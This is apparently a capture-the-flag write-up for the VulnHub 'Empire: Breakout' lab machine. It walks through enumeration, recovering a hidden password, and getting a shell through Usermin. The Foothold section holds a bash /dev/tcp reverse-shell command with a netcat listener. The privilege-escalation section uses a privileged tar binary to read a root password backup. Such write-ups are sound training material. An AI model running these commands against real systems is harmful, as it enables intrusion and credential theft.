# Empire : Breakout CTF by vulnhub

# Tools used

1. Nmap
2. 


# Step 1 : Enumeration

First of all we need to find the IP address of the target machine and for that we can use `nmap` as follows;

<img width="955" height="369" alt="image" src="https://github.com/user-attachments/assets/68644c22-9e86-4c52-85e6-902eb546b9e3" />

We could also use `netdiscover` to scan for the other machines on the network.

Here, we find an active host on the network withe the IP 10.38.1.114. 
We also find some open ports on the target.

To get more information on the ports we can use `nmap -sC -sV 10.38.1.114`.

<img width="955" height="565" alt="image" src="https://github.com/user-attachments/assets/7818a331-6da4-4450-9d54-33974546c282" />

Using your preferred browser you can head to the following sites;
  1. `http://10.38.1.114`
  2. `http://10.38.1.114:10000`
  3. `http://10.38.1.114:20000`

On `http://10.38.1.114` we find an apache debian default page.

<img width="955" height="887" alt="image" src="https://github.com/user-attachments/assets/e1e61eb0-b7c6-4ecd-a770-0e9e4e19300e" />

On `http://10.38.1.114:10000` we find a webmin login site.

<img width="1145" height="890" alt="image" src="https://github.com/user-attachments/assets/18df7722-51fb-4903-98ec-5c1de794e8fa" />

On `http://10.38.1.114:20000` we find a usermin login page.

<img width="955" height="891" alt="image" src="https://github.com/user-attachments/assets/75f87085-f692-4a3a-aaba-05e93086e8b3" />

## Step 2 : Foothold

To try and get a foothold of the machine we could first try to use `smbclient`to see if anonymous access is allowed or not since we have 2 samba ports.
Use the command `smbclient //10.38.1.114/` and if it prompts you for a password leave it blank and click enter.

<img width="955" height="225" alt="image" src="https://github.com/user-attachments/assets/d9f85f2a-8377-47ff-b5be-488f72e9e24d" />

We find that the anonymous login is not possible.
Now you can try running `enum4linux`. This is a tool used to enumerate samba ports.

Using the command `enum4linux -a 10.38.1.114` we find a user called cyber on the network.

<img width="955" height="888" alt="image" src="https://github.com/user-attachments/assets/66592f36-295f-4107-a7ad-d762d4c8c34c" />

Reviewing the source code of the apache website (by right clicking your mouse and clicking the view page source) we find a brainfuck program when we scroll all the way down.

We can use a decoder to decode the program to a readable language, for this we can search `brainfuck decoder` on the browser (if the browser does not load you could save the machine state and on the virtual box application change the network settings to bridged adapter MAKE SURE TO CHANGE AFTER DECODING THE PROGRAM)
I used https://www.dcode.fr to decode the program. Paste the code and hit execute this returns the password `.2uqPEfj3D<p'a-3`.

<img width="955" height="847" alt="image" src="https://github.com/user-attachments/assets/16805276-13d7-4b58-bba4-595b8e9b2906" />

Using the username `cyber` and the password `.2uqPEfj3D<p'a-3` we can login to the usermin web page.
On logggin in we find a command shell on the bottom. We can execute `ls` to see the files and directories on the machine.

<img width="581" height="190" alt="image" src="https://github.com/user-attachments/assets/e4364345-28ee-44a3-b1e2-93be9f11cd60" />

Here, we find the first flag `user.txt`.

Now we can set up a reverse shell using the command `bash -i>& /dev/tcp/10.38.1.110/4242 0>&1` on the target and have a listener `nc -lnvp 4242` on the host machine.
Go to the usermin tab, select login and select the command shell.

<img width="1920" height="712" alt="image" src="https://github.com/user-attachments/assets/56502b61-e153-42e5-adc9-56526d0bc435" />

<img width="724" height="140" alt="image" src="https://github.com/user-attachments/assets/dd3f87ce-266a-405f-9494-283ab9396357" />

To make the terminal interactive run `python3 -c "import pty;pty.spawn('/bin/bash')"`.

## Step 3 : Priviledge Escalation

First we need to find what kind of priviledges we have and by running `sudo -l` we find that even sudo has not been installed.

<img width="538" height="78" alt="image" src="https://github.com/user-attachments/assets/bd27afa4-8603-4178-953e-d39c014b4758" />

This means that we will have to do this locally.

Run ` ls -al` to see all the directories and files on the machine.

<img width="955" height="305" alt="image" src="https://github.com/user-attachments/assets/48f0a26e-9190-4df7-991a-182f48359608" />

Here we find that `tar` has root priviledges, take note of this.

We could also run `ls -al /var` to look for additional files and directories. Here we find a backups directories.

<img width="955" height="226" alt="image" src="https://github.com/user-attachments/assets/62a2642f-967f-48f4-899a-c80c2f0960e5" />

Run `ls -al /var/backups ` to see the files under it also.

<img width="955" height="226" alt="image" src="https://github.com/user-attachments/assets/be9606cd-41da-4dc4-b010-7ea49522e6dd" />

Here we find something interesting. We find a `old_pass.bak` file but we cannot access it since we do not have root priviledges.
Remember the `tar` command we took note of earlier that has root priviledges, we could use that to open the file.
`Tar` is a command used to archive files. 
We can execute the command `./tar -cf backup.tar /var/backups/.old_pass.bak`. This command creates an archive file (backup.tar) and saves the contents of old_pass.bak in it.

<img width="681" height="115" alt="image" src="https://github.com/user-attachments/assets/6f0d0b9f-e674-45f7-8213-6bd5ef73e040" />

Running `ls` we find that the backup.tar file has been saved.
We can now extract it using the `./tar -xf backup.tar` command.

Run `ls` again and now we find the var directory and when we switch to it and `ls` again we find a backups directory that now has the `old_pass.bak` file.
Using `cat old_pass.bak` we can open the file and see its contents.
On opening the file we find some sort of password that could be the password to root.

<img width="955" height="368" alt="image" src="https://github.com/user-attachments/assets/981a1064-71ba-409e-9f83-7fa8da291817" />

Execute `su root` and enter the password. This gives us root priviledges.
We can now change to the home directory and on running `ls` we find a `rOOt.txt` file that is the root flag.

<img width="617" height="112" alt="image" src="https://github.com/user-attachments/assets/217237ed-bd8e-4bab-9276-6f5aa67aeb82" />

# Congratulations on completing The Empire:Breakout CTF
# Cheers and happy hacking ,ethically of course







